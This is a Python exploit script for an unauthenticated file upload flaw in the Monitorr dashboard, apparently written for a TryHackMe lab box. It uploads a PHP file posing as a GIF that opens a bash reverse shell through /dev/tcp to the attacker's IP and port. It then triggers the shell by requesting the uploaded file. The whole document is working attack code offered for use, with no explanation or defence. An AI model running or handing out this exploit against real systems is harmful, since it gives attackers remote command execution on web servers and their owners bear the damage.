#!/usr/bin/env python3

from time import sleep
import requests
import validators
import string
import random
import sys

def exploit(url, ip, port):
    session = requests.Session()
    file_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
    requests.packages.urllib3.disable_warnings() 
    proxy = {'http':'http://127.0.0.1:8080'}
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", 
            "Accept": "text/plain, */*; q=0.01", 
            "Accept-Language": "en-US,en;q=0.5", 
            "Accept-Encoding": "gzip, deflate", 
            "X-Requested-With": "XMLHttpRequest", 
            "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", 
            "Origin": url, 
            "Connection": "close", 
            "Referer": url}
    payload = f"-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{file_name}.gif.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+ ip +"/" + port + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
    session.get(url, headers=headers, verify=False)
    req = session.post(url+"/assets/php/upload.php", data=payload, headers=headers, proxies=proxy, verify=False)
    if ("is not an image" in req.text):
        print(f"[!] Falied to upload {file_name} file: " + req.text)
    else:
        sleep(0.5)
        print(f"[+] Successfully upload payload")
        sleep(0.5)
        print("[+] Triggering reverse shell")
        sleep(0.5)
        try:
            session.get(url + f"/assets/data/usrimg/{file_name}.gif.phtml", headers=headers, verify=False, timeout=1.5)
        except:
            print("[*] Should've got rev shell")
            sys.exit(0)

if __name__ == '__main__':
    print("[*] Example usage: \r\n\t> url: https://monitorr.robyns-petshop.thm\r\n\t> local ip: 57.123.456.789\r\n\t> local port: 443\r\n-------------------------")
    userURL = input("> url (include schema): ")
    if validators.url(userURL) == True:
        userIP = input("> local ip: ")
        userPort = input("> local port: ")
        exploit(userURL, userIP, userPort)
    else:
        print("\n[!] Invalid URL")
        print("[+] Example URL: https://monitorr.robyns-petshop.thm")



